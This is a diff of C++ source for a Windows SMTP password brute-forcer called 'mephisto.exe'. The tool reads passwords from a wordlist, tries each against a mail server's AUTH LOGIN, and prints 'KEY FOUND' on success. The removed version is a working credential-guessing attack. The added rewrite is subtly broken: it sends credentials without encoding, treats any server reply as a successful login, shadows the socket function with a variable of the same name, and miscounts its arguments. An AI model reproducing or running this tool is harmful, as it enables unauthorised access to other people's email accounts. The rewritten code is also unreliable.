@@ -1,170 +1,125 @@
 #include <iostream>
 #include <fstream>
-#include <sstream>
 #include <string>
+#include <sstream>
 #include <winsock2.h>
 #include <windows.h>
-#include "smtp_bruteforce.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
-using namespace std;
-
-#define MAX_BUFFER_SIZE 1024
-
-// Base64 encoding table
-const string base64_chars =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    "abcdefghijklmnopqrstuvwxyz"
-    "0123456789+/"
-    "=";
-
-// Base64 encoding function
-string base64Encode(const string &in) {
-    string out;
-    int val = 0, valb = -6;
-    for (unsigned char c : in) {
-        val = (val << 8) + c;
-        valb += 8;
-        while (valb >= 0) {
-            out.push_back(base64_chars[(val >> valb) & 0x3F]);
-            valb -= 6;
-        }
-    }
-    if (valb > -6) {
-        out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
-    }
-    while (out.size() % 4) {
-        out.push_back('=');
-    }
-    return out;
+void printUsage() {
+    std::cout << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> smtp.example.com <port>" << std::endl;
 }
 
-// Function to initialize Winsock
-bool initWinsock() {
-    WSADATA wsaData;
-    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
-}
-
-// Function to establish connection to the SMTP server
-SOCKET connectToSMTPServer(const string &hostname, int port) {
-    sockaddr_in server;
-    SOCKET sock;
-    hostent *host = gethostbyname(hostname.c_str());
-    
-    if (host == nullptr) {
-        cerr << "Error: Unable to resolve hostname" << endl;
-        return INVALID_SOCKET;
-    }
-
-    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        cerr << "Error: Unable to create socket" << endl;
-        return INVALID_SOCKET;
-    }
-
-    server.sin_family = AF_INET;
-    server.sin_port = htons(port);
-    server.sin_addr = *((in_addr*)host->h_addr_list[0]);
-
-    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-        cerr << "Error: Unable to connect to the server" << endl;
-        closesocket(sock);
-        return INVALID_SOCKET;
-    }
-
-    return sock;
-}
-
-// Function to send data to the SMTP server
-bool sendData(SOCKET sock, const string &data) {
-    if (send(sock, data.c_str(), data.size(), 0) == SOCKET_ERROR) {
-        cerr << "Error: Unable to send data" << endl;
-        return false;
-    }
-    return true;
-}
-
-// Function to receive data from the SMTP server
-string receiveData(SOCKET sock) {
-    char buffer[MAX_BUFFER_SIZE];
-    int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
-    if (bytesReceived == SOCKET_ERROR) {
-        cerr << "Error: Unable to receive data" << endl;
-        return "";
-    }
-    buffer[bytesReceived] = '\0';
-    return string(buffer);
-}
-
-// Function to brute-force the SMTP login
-bool bruteForceSMTP(const string &username, const string &password, const string &hostname, int port) {
-    SOCKET sock = connectToSMTPServer(hostname, port);
-    if (sock == INVALID_SOCKET) return false;
-
-    // Receive banner
-    string banner = receiveData(sock);
-    if (banner.find("220") == string::npos) {
-        closesocket(sock);
-        return false;
-    }
-
-    // Send EHLO command
-    sendData(sock, "EHLO localhost\r\n");
-    receiveData(sock);
-
-    // Send AUTH LOGIN command
-    sendData(sock, "AUTH LOGIN\r\n");
-    string authResponse = receiveData(sock);
-    if (authResponse.find("334") == string::npos) {
-        closesocket(sock);
-        return false;
-    }
-
-    // Send base64 encoded username
-    sendData(sock, base64Encode(username) + "\r\n");
-    receiveData(sock);
-
-    // Send base64 encoded password
-    sendData(sock, base64Encode(password) + "\r\n");
-    string loginResponse = receiveData(sock);
-
-    if (loginResponse.find("235") != string::npos) {
-        cout << "KEY FOUND: " << password << endl;
-        closesocket(sock);
+bool sendCommand(SOCKET socket, const std::string& command) {
+    send(socket, command.c_str(), command.length(), 0);
+    char buffer[512];
+    int bytesReceived = recv(socket, buffer, sizeof(buffer), 0);
+    if (bytesReceived > 0) {
+        buffer[bytesReceived] = '\0';
+        std::cout << buffer << std::endl;
         return true;
     }
-
-    closesocket(sock);
     return false;
 }
 
-int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        cerr << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> smtp.example.com <port>" << endl;
-        return -1;
+bool tryLogin(SOCKET socket, const std::string& username, const std::string& password) {
+    std::string command = "AUTH LOGIN\r\n";
+    if (!sendCommand(socket, command)) return false;
+
+    command = username + "\r\n";
+    if (!sendCommand(socket, command)) return false;
+
+    command = password + "\r\n";
+    if (!sendCommand(socket, command)) return false;
+
+    return true;
+}
+
+bool bruteForceSMTP(const std::string& server, int port, const std::string& username, const std::string& wordlist) {
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    SOCKET socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (socket == INVALID_SOCKET) {
+        std::cerr << "Socket creation failed." << std::endl;
+        return false;
     }
 
-    string username = argv[2];
-    string wordlistPath = argv[4];
-    string hostname = argv[3];
-    int port = stoi(argv[5]);
+    struct sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(port);
+    serverAddr.sin_addr.s_addr = inet_addr(server.c_str());
 
-    // Load wordlist
-    ifstream wordlist(wordlistPath);
-    if (!wordlist.is_open()) {
-        cerr << "Error: Unable to open wordlist file" << endl;
-        return -1;
+    if (connect(socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        std::cerr << "Connection failed." << std::endl;
+        closesocket(socket);
+        WSACleanup();
+        return false;
     }
 
-    string password;
-    while (getline(wordlist, password)) {
-        if (bruteForceSMTP(username, password, hostname, port)) {
-            return 0;
+    char buffer[512];
+    int bytesReceived = recv(socket, buffer, sizeof(buffer), 0);
+    if (bytesReceived <= 0) {
+        std::cerr << "Failed to receive data from the server." << std::endl;
+        closesocket(socket);
+        WSACleanup();
+        return false;
+    }
+    buffer[bytesReceived] = '\0';
+    std::cout << "Server Response: " << buffer << std::endl;
+
+    std::ifstream wordlistFile(wordlist);
+    if (!wordlistFile.is_open()) {
+        std::cerr << "Failed to open wordlist." << std::endl;
+        closesocket(socket);
+        WSACleanup();
+        return false;
+    }
+
+    std::string password;
+    while (std::getline(wordlistFile, password)) {
+        if (tryLogin(socket, username, password)) {
+            std::cout << "KEY FOUND: " << password << std::endl;
+            closesocket(socket);
+            WSACleanup();
+            return true;
         }
     }
 
-    cout << "KEY NOT FOUND" << endl;
-    wordlist.close();
-    return 0;
+    std::cout << "KEY NOT FOUND" << std::endl;
+    closesocket(socket);
+    WSACleanup();
+    return false;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 5) {
+        printUsage();
+        return 1;
+    }
+
+    std::string username;
+    std::string wordlist;
+    std::string server;
+    int port;
+
+    for (int i = 1; i < argc; i++) {
+        if (std::string(argv[i]) == "-l") {
+            username = argv[++i];
+        } else if (std::string(argv[i]) == "-P") {
+            wordlist = argv[++i];
+        } else if (std::string(argv[i]).find("smtp.") != std::string::npos) {
+            server = argv[i];
+        } else {
+            port = std::stoi(argv[i]);
+        }
+    }
+
+    if (username.empty() || wordlist.empty() || server.empty() || port == 0) {
+        printUsage();
+        return 1;
+    }
+
+    return bruteForceSMTP(server, port, username, wordlist) ? 0 : 1;
 }
